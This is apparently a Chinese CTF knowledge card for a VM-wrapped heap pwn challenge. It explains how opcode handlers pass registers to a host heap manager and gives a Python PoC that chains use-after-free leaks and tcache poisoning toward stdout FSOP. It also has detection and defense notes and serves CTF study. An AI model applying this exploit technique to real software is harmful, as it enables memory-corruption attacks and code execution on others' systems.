---
id: ctf-pwn-vm-opcode-heap-primitive-wrapper-uaf-leak
title: VM 套堆题：用 case '3'/'5' 把寄存器映射成 heap(opt,size,ptr,size) 四参，借 data 段中转实现 add/free/edit/show 与 UAF 泄露
type: scenario
domain: ctf
path: ctf/pwn
technique: vm-opcode-heap-primitive-wrapper
aliases:
- VM 套 heap
- VM 堆原语封装
- case 3 case 5 heap 传参
- vmdata 中转
- VM 题 show/edit 封装
- VM 里打 UAF
tags:
- ctf
- pwn
- vm
- heap
- uaf
- opcode
- encoder
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W4
  verified_at: '2026-11-08T13:55:38+08:00'
  notes: 已对照原文核对 mmap 三段固定地址、heap(int opt,a2,a3,a4) 的 case 0 read/1 write/2 exit/3 add/4 free_0/5 edite/6 read_str 与 data 段范围校验、case 3 传参 heap(a2->int1,reg[0],reg[1],reg[2]) 与 case 5 传参 heap(a2->int1,reg[0],&data[reg[1]],reg[2])、以及 exp 中 set_reg/fun0/read_bss/show_bss/add/free/edit/show 封装与 add(0x458)/0x3f8、free 0/1/2 后不置空的 UAF 链均与原文及截图 02、03 一致；未验证点：原文 exp 把 heap 功能号 6(read_str) 用作 show 的取回路径，卡内已照此说明但未实测；收尾 stdout FSOP 细节属 skipped 部分未成卡。另修正 2 处：一句话结论中 case 3/5 的传参描述对齐原文，失效关联链接改指已存在的 FSOP 卡。
---

## 一句话结论

VM 只是外壳、真正的漏洞在它调用的堆管理器：handler 里 `case '3'` 把 `heap(a2->int1, reg[0], reg[1], reg[2])` 当「功能号 + 三个参数」调用（`3`=add、`4`=free、`5`=edit、`6`=read_str，原文 exp 里把 6 当 show 用），`case '5'` 则用 `heap(a2->int1, reg[0], &data[reg[1]], reg[2])` 把**虚拟数据段的偏移**当地址传进去；因此只要先用 `mov reg` 把参数摆好、再发一条 `case '3'/'5'`，就能用纯 opcode 流完成 add/free/edit/show，而 `edit`/`show` 的读写内容都经 `vmdata` 数据段中转（先读进 data 段、再让堆函数从 data 段取），UAF 就照常在堆层生效。

## 原理

- 题目把 `mmap` 出来的三段固定地址分别当 code/data/stack：`vmdata = mmap(0x64617461000, 0x30000)`（数据段，程序里的字符串常量也放在这）、`vmcode = mmap(0x7063000, 0x10000)`（用户输入的 opcode 流）、`mmap(0x73746163000, 0x20000)+0x10000`（栈段）。三段都在固定地址上，所以 opcode 里可以直接用绝对偏移当「指针」。
- 堆管理器入口是 `heap(int opt, unsigned a2, void *a3, size_t a4)`：`opt` 为功能号，`a2` 是索引/大小，`a3` 是数据指针。VM 的 handler 只做「把虚拟寄存器搬进这四个参数」，不做任何地址/权限校验——于是 VM 成了堆 API 的「远程调用封装」。
- `case '3'` 的调用是 `heap(a2->int1, a1->reg[0], a1->reg[1], a1->reg[2])`：四个参数完全来自 `reg[0..2]` 与操作码里的立即数，所以按需 `mov reg` 即可指定索引与大小。
- `case '5'` 的调用是 `heap(a2->int1, a1->reg[0], &a1->data[a1->reg[1]], a1->reg[2])`：`a3` 由 `reg[1]` 决定的**数据段内偏移**给出。这就是「中转」的核心——edit 的内容不是从网络/标准输入直接进堆，而是先被 `read_str` 读到 data 段某个偏移，再由堆函数从该偏移拷进堆块；同理 show 把堆内容写到 data 段偏移，再由 VM 的 `write` 打出来。
- 为什么必须用 VM 的 `read_str`（`case '6'`）而不是直接 `edit`：`edit` 的源地址是 data 段偏移，data 段里没有数据就等于往堆块里拷零；因此「先 `read_bss(offset,size)` 让程序把用户输入读进 data 段，再 `edit`」是必须的两步，且两步都必须用 opcode 表达。
- 因为堆函数集合里有 `free` 而没有把指针置空（`case 4` → `free_0(idx)`），UAF 直接成立：`free(idx)` 之后 `show(idx)`/`edit(idx)` 仍可访问原块。原文的利用链因此很常规：free 大 chunk 进 unsorted 泄 libc、free 两块进 tcache、UAF 读 tcache key 泄 heap、UAF 改 tcache fd 劫持目标结构。
- 为什么这套封装不会挡路：VM 只提供 `reg[0..7]` 这样的寄存器（示例里用到 `reg[0..2]` 与 `reg[6]/reg[7]` 的 push/pop），参数够用；opcode 的立即数支持 qword（`fmt=3`），足以把 0x64617461000 这类绝对地址写进寄存器。
- 判据：如果 `show` 的输出能读到 `0x64617...`/`0x73746...` 这类固定段的地址，说明数据确实经 data 段中转，而非直接回显堆内容。

## 触发条件

- VM 题的 handler 把虚拟寄存器直接映射到宿主堆函数参数（本例 `case '3'`/`case '5'`），不做地址合法性/长度校验。
- 堆管理器存在 UAF（free 后不置空）或其它可组合缺陷；`add` 的大小可控（示例可申请 0x458/0x3f8/0xf8 等）。
- 虚拟数据段（vmdata）地址固定且在 opcode 可直接寻址（`mmap` 指定地址、非随机）。
- 能自由生成 opcode 流（已还原 opcode 编码，见关联卡）。
- 程序结束时仍有可用的输出函数（本例只有 `puts`，无 `exit` 的 libc 清理链）。

## 利用步骤

1. 还原 opcode 编码后，先写三个基础封装：`set_reg(i, v)`（`fmt=3, case=3`）、`fun0(case, int1)`（`fmt=0` 三字节大端）、`fun3(case, int1, qword)`。
2. 再写 `add(size)`=`set_reg(0,size)+fun0(0x33,3)`、`free(idx)`=`set_reg(0,idx)+fun0(0x33,4)`；注意 `case '3'` 里的 `int1` 是功能号、`reg[0]` 是首个实参。
3. 写 `read_bss(off,size)`：`set_reg(0,0)+set_reg(1,off)+set_reg(2,size)+fun0(0x35,0)`（`case '5'` + 功能号 0 = read，把标准输入读进 data 段偏移）；`show_bss(off,size)` 用功能号 1 = write，把 data 段内容打到屏幕。
4. 写 `edit(idx,size)`：`show_bss(7,5)`（先把提示语 "input" 打出来，方便脚本同步）+ `read_bss(0x100,size)`（用户输入落到 data 段 0x100）+ `set_reg(0,idx)`+`set_reg(1,0x100)`+`set_reg(2,size)`+`fun0(0x33,5)`（调 `case '3'` 功能号 5 = edit，ptr=data+0x100）。
5. 写 `show(idx,size)`：先 `show_bss(0x12,9)` 打出 "opcodes:\n" 作为输出锚点，再 `set_reg(0,idx)`+`set_reg(1,0x500)`+`set_reg(2,size)`+`fun0(0x33,6)`（`case '3'` 功能号 6 落到 heap 的 `read_str`，原文 exp 正是用它把堆块内容取出到 data+0x500），最后 `show_bss(0x500,size)` 打出来。
6. 按堆题常规打：`add(0x458)` 大块 + `free` → unsorted 泄 libc（读出 fd/bk）；`free` 两块进 tcache → UAF 读 tcache key 得 heap；再用 UAF 改 tcache fd 劫持 `_IO_2_1_stdout_`。
7. 每次 `edit` 后脚本用 `sa(b"input", payload)` 对齐输入点，每次 `show` 用 `ru(b"opcodes:\n")` 再 `recv(8)` 取 8 字节泄露值。

## PoC

```python
# 未在本机执行；编码器与原文 exp 的封装层一致
def set_reg(reg, v):        return fun3(3, reg, v)          # fmt=3, case=3 : reg[i] = qword imm
def read_bss(off, size):
    return set_reg(0, 0) + set_reg(1, off) + set_reg(2, size) + fun0(0x35, 0)   # case '5' opt=0 read
def show_bss(off, size):
    return set_reg(0, 1) + set_reg(1, off) + set_reg(2, size) + fun0(0x35, 1)   # case '5' opt=1 write
def add(size):              return set_reg(0, size) + fun0(0x33, 3)             # case '3' opt=3 add
def free(idx):              return set_reg(0, idx)  + fun0(0x33, 4)             # case '3' opt=4 free
def edit(idx, size):
    return show_bss(7, 5) + read_bss(0x100, size) \
         + set_reg(0, idx) + set_reg(1, 0x100) + set_reg(2, size) + fun0(0x33, 5)
def show(idx, size):
    return show_bss(0x12, 9) \
         + set_reg(0, idx) + set_reg(1, 0x500) + set_reg(2, size) + fun0(0x33, 6) \
         + show_bss(0x500, size)

payload  = add(0x458) + add(0x3f8) + add(0x3f8)      # 0,1,2
payload += free(0) + free(1) + free(2)               # free 后不置空 -> UAF
payload += add(0x458)                                # 3: 复用 0 的块
payload += show(3, 8) + show(1, 8)                   # 泄 libc（unsorted fd）与 heap（tcache key）
payload += edit(2, 8)                                # UAF 改 tcache fd
```

## 变体与关联

- 变体：VM 的 handler 直接暴露「任意地址写/读」（`reg` 当宿主指针），此时 VM 自身就是任意读写原语，不需要经 data 段中转（见关联卡）。
- 变体：`read_str`/`write` 走的是 `vmdata` 的绝对地址，因此可以借 data 段把 `p64` 目标地址当数据传给堆函数，用于伪造 chunk 头（overlapping/大块合并）。
- 变体：若 VM 提供 `push/pop`（本例 `reg[6]/reg[7]`），可用栈段在 data 段之外再开一块「寄存器溢出区」，把 `reg` 里塞不下的值暂存。
- 关联：[[ctf-reverse-vm-opcode-low2-format-high6-dispatch]]（前置：先还原 opcode 编码才能写这些封装）、[[binary-pwn-heap-house-of-apple-2-stderr-fsop]]（封装完成后实际打 FILE 结构 FSOP 的落点，该卡亦覆盖改打 `_IO_2_1_stdout_` 的布局）、[[binary-pwn-heap-uaf-unsorted-bin-libc-leak]]（本条泄 libc 的通用原理）、[[ctf-pwn-menu-uaf-heap-overflow-tcache-poison-freehook-system]] 一类菜单题卡（UAF+tcache 投毒的通用手法）。
- 边界：VM 若对寄存器/数据段偏移做严格边界检查（本例 handler 里有 `if_big_than_0x3000` 校验，但 `case '3'` 路径仍有可绕处），则这条「封装成任意堆操作」的路径会受限；data 段地址若随机（非固定 mmap）则 opcode 里无法写死偏移。

## 检测与防御

- 检测（出题/防守）：VM handler 直接把虚拟寄存器喂给宿主堆函数，等价于「给攻击者一个堆 API」，应把「VM 指令」与「宿主内存操作」解耦，并对每个参数做范围/所有权校验。
- 检测（分析）：`case` 分支里出现「四参数 = reg[0..2]」或「&data[reg[x]]」的调用形态、程序同时存在固定地址 `mmap` 三段，是 VM 套堆题的强特征。
- 防御：`free` 后置空、`edit` 校验长度不超过块大小、限制 `add` 的最大尺寸并隔离 metadata；VM 层对 `reg` 索引、data 偏移、功能号分别白名单校验。
